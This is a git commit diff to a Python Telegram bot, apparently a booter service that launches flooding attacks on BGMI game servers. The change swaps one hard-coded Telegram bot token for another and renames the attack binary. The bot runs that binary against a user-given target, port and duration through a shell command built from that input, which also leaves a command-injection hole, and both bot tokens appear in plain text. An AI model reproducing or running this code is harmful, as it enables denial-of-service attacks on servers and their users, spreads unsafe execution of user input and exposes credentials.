c75eeb3975ed23a4e3fe9bcae8b6479ad2c7dcd4
ravirik335 <pm7240441905@gmail.com>
2025-03-05 17:09:17 +0530

    Update bgmi.py

--- bgmi.py
+++ bgmi.py
@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7702515994:AAGAXdCpDkA7-yXDk99ifrtRRD5z0hIP42s')
+bot = telebot.TeleBot('7702515994:AAHTS2tdWl7kUBc8Sffo7ZArHxl1Bin4Bso')
 
 # Admin user IDs
 admin_id = ["6864281179"]
@@ -313,7 +313,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 900"
+                full_command = f"./Rahul {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
